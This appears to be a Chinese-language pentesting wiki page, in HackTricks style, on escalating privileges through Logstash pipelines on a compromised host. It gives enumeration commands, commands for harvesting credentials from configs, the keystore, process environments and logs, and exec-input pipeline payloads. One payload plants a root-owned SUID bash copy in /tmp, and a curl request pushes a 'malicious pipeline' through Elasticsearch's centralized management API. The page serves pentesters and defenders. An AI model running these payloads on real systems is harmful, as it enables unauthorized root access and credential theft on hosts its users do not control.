# Logstash 权限提升

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash 用于通过称为 **pipelines** 的系统来**收集、转换和分发日志**。这些 pipelines 由 **input**、**filter** 和 **output** 阶段组成。<sup>[[4]](#references)</sup> 当 Logstash 在一台已被入侵的机器上运行时，会出现一个值得关注的情况。

### Pipeline 配置

在 Debian 和 RPM 软件包安装中，pipelines 通过 **/etc/logstash/pipelines.yml** 进行配置，其中列出了 pipeline 配置文件的位置；其他发行版则将 `pipelines.yml` 放在 Logstash 的 `path.settings` 目录中。<sup>[[5]](#references)[[6]](#references)</sup>
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
此文件揭示了包含 pipeline 配置的 **.conf** 文件所在位置。使用 **Elasticsearch output** 时，请检查其 `user`/`password`、`cloud_auth` 或 `api_key` 设置；该账户的有效权限取决于 Elasticsearch。`path.config` glob 会加载该 pipeline 的所有匹配文件。<sup>[[6]](#references)[[7]](#references)[[11]](#references)</sup>

如果 Logstash 使用 `-f <directory>` 启动，而不是使用 `pipelines.yml`，则 `-f` 优先，并且**该目录中的所有文件会按字典序拼接，然后作为单个 config 进行解析**。<sup>[[6]](#references)[[7]](#references)</sup>这会带来两点攻击层面的影响：

- 放置一个类似 `000-input.conf` 或 `zzz-output.conf` 的文件，可能改变最终 pipeline 的组装方式
- 格式错误的文件可能导致合并后的 config 验证失败；重新加载期间，Logstash 会保留之前的 pipeline，因此在依赖 auto-reload 前应先验证 payload。<sup>[[1]](#references)</sup>

### 在已入侵主机上快速枚举

在安装了 Logstash 的主机上，快速检查：
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
同时检查本地 monitoring API 是否可访问。默认情况下，它绑定在 **127.0.0.1:9600**，在进入主机后通常就足够了。<sup>[[8]](#references)</sup>
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
这些 endpoints 会暴露 pipeline IDs 和设置、运行时指标，以及配置重新加载成功/失败计数器，有助于确认更改是否已被接受。<sup>[[8]](#references)[[17]](#references)[[18]](#references)</sup>

如果恢复的凭据针对 **Elasticsearch**，请查看[这个关于 Elasticsearch 的页面](../../network-services-pentesting/9200-pentesting-elasticsearch.md)。

### 通过可写 Pipelines 提权

要尝试提权，首先确定 Logstash 服务实际以哪个用户身份运行；不要假设它以 root 或 **logstash** 用户身份运行。确保满足以下**至少一个**条件：

- 拥有对 pipeline **.conf** 文件的**写入权限**，**或者**
- **/etc/logstash/pipelines.yml** 文件使用了通配符，并且你可以写入目标文件夹。<sup>[[6]](#references)[[7]](#references)</sup>

此外，还必须满足以下**至少一个**条件：

- 能够重启 Logstash 服务，**或者**
- **/etc/logstash/logstash.yml** 文件将 **config.reload.automatic: true** 设置为 true。<sup>[[1]](#references)[[15]](#references)</sup>

如果配置中存在通配符，创建一个与该通配符匹配的文件即可实现命令执行。<sup>[[7]](#references)[[9]](#references)</sup>例如：
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
在此，**interval** 决定以秒为单位的执行频率。在给定示例中，**whoami** 命令每 120 秒运行一次，其输出被定向到 **/tmp/output.log**。<sup>[[9]](#references)</sup>

在 **/etc/logstash/logstash.yml** 中设置 **config.reload.automatic: true** 后，Logstash 会自动检测并应用新的或已修改的 pipeline 配置，无需重启。<sup>[[1]](#references)[[15]](#references)</sup> 如果没有通配符，仍然可以修改现有配置，但应谨慎操作，以避免造成中断。

### 更可靠的 Pipeline Payload

`exec` input plugin 在当前版本中仍然有效，并且需要 **interval** 或 **schedule** 其中之一。它通过 **fork** Logstash JVM 来执行，因此如果内存紧张，payload 可能会因 `ENOMEM` 而失败，而不是静默运行。<sup>[[9]](#references)</sup>

当该服务拥有创建 root-owned SUID 文件的足够权限时，一种实用的 privilege-escalation payload 是留下一个持久性 artifact：
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
如果你没有 restart 权限但可以向进程发送 signal，Logstash 也支持在类 Unix 系统上通过 **SIGHUP** 触发重新加载：<sup>[[1]](#references)</sup>
```bash
kill -SIGHUP $(pgrep -f logstash)
```
请注意，并非每个 plugin 都支持 reload。例如，**stdin** input 会阻止 automatic reload，因此不要假设 `config.reload.automatic` 总能获取你的更改。<sup>[[1]](#references)</sup>

### 从 Logstash 窃取 Secrets

在只关注 code execution 之前，先收集 Logstash 已经能够访问的数据：

- Credentials 可能出现在 `elasticsearch {}` outputs、`http_poller` URLs/settings、JDBC inputs 或 cloud-related settings 中；这些 plugins 暴露了值得搜索的 credential fields。<sup>[[11]](#references)[[12]](#references)[[13]](#references)</sup>
- Secure settings 可能位于 **`/etc/logstash/logstash.keystore`** 或其他 `path.settings` directory 中。<sup>[[5]](#references)[[10]](#references)</sup>
- Keystore password 可能通过 **`LOGSTASH_KEYSTORE_PASS`** 提供，而 RPM/DEB installs 会从 **`/etc/sysconfig/logstash`** 加载 service environment variables。<sup>[[10]](#references)</sup>
- 使用 `${VAR}` 的 environment-variable expansion 会在 Logstash startup 时解析，因此值得检查 service environment。<sup>[[14]](#references)</sup>

有用的检查：
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
由于 **CVE-2023-46672** 表明，在特定情况下，Logstash 会在其日志中记录敏感信息，包括存储在其 keystore 中并在配置中引用的 secrets；如果这些情况可能适用，请检查旧的 Logstash 日志和 `journald` 条目。<sup>[[3]](#references)</sup>

### Centralized Pipeline Management Abuse

在某些环境中，主机**完全不依赖**本地 `.conf` 文件。如果配置了 **`xpack.management.enabled: true`**，Logstash 可以从 Elasticsearch/Kibana 拉取集中管理的 pipelines；启用此模式后，本地 pipeline 配置将不再是事实来源。<sup>[[2]](#references)</sup>

这意味着存在另一条攻击路径：

1. 从本地 Logstash 设置、keystore 或日志中恢复 Elastic 凭据。<sup>[[3]](#references)[[10]](#references)</sup>
2. 验证该账户是否具有 **`manage_logstash_pipelines`** cluster privilege。<sup>[[16]](#references)</sup>
3. 创建或替换一个集中管理的 pipeline，使 Logstash 主机在下一次轮询间隔执行你的 payload。<sup>[[2]](#references)[[16]](#references)</sup>

此功能使用的 Elasticsearch API 为：<sup>[[16]](#references)</sup>
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"last_modified": "2026-01-02T02:50:51.250Z",
"username": "user",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {
"pipeline.workers": 1,
"pipeline.batch.size": 1,
"pipeline.batch.delay": 50,
"queue.type": "memory",
"queue.max_bytes": "1gb",
"queue.checkpoint.writes": 1024
}
}'
```
当本地文件为只读状态，但 Logstash 已注册为从远程获取 pipelines 时，这尤其有用。<sup>[[2]](#references)[[16]](#references)</sup>

## References

- [1] [Elastic Docs：重新加载配置文件](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [2] [Elastic Docs：配置集中式 Pipeline 管理](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)
- [3] [Logstash 8.11.1 Security Update (ESA-2023-26) - CVE-2023-46672](https://discuss.elastic.co/t/logstash-8-11-1-security-update-esa-2023-26/347191)
- [4] [Elastic Docs：创建 Logstash Pipeline](https://www.elastic.co/docs/reference/logstash/creating-logstash-pipeline)
- [5] [Elastic Docs：Logstash 目录布局](https://www.elastic.co/docs/reference/logstash/dir-layout)
- [6] [Elastic Docs：多个 Pipeline](https://www.elastic.co/docs/reference/logstash/multiple-pipelines)
- [7] [Elastic Docs：从命令行运行 Logstash](https://www.elastic.co/docs/reference/logstash/running-logstash-command-line)
- [8] [Elastic Docs：使用 API 监控 Logstash](https://www.elastic.co/docs/reference/logstash/monitoring-logstash)
- [9] [Elastic Docs：Exec input plugin](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-exec)
- [10] [Elastic Docs：用于安全设置的 Secrets keystore](https://www.elastic.co/docs/reference/logstash/keystore)
- [11] [Elastic Docs：Elasticsearch output plugin](https://www.elastic.co/docs/reference/logstash/plugins/plugins-outputs-elasticsearch)
- [12] [Elastic Docs：Http_poller input plugin](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-http_poller)
- [13] [Elastic Docs：Jdbc input plugin](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-jdbc)
- [14] [Elastic Docs：使用环境变量](https://www.elastic.co/docs/reference/logstash/environment-variables)
- [15] [Elastic Docs：logstash.yml](https://www.elastic.co/docs/reference/logstash/logstash-settings-file)
- [16] [Elasticsearch API：创建或更新 Logstash Pipeline](https://www.elastic.co/docs/api/doc/elasticsearch/operation/operation-logstash-put-pipeline)
- [17] [Logstash API：获取 Pipeline 的设置](https://www.elastic.co/docs/api/doc/logstash/operation/operation-nodeinfopipelines)
- [18] [Logstash API：获取 Pipeline 的统计信息](https://www.elastic.co/docs/api/doc/logstash/operation/operation-nodestatspipelines)
{{#include ../../banners/hacktricks-training.md}}
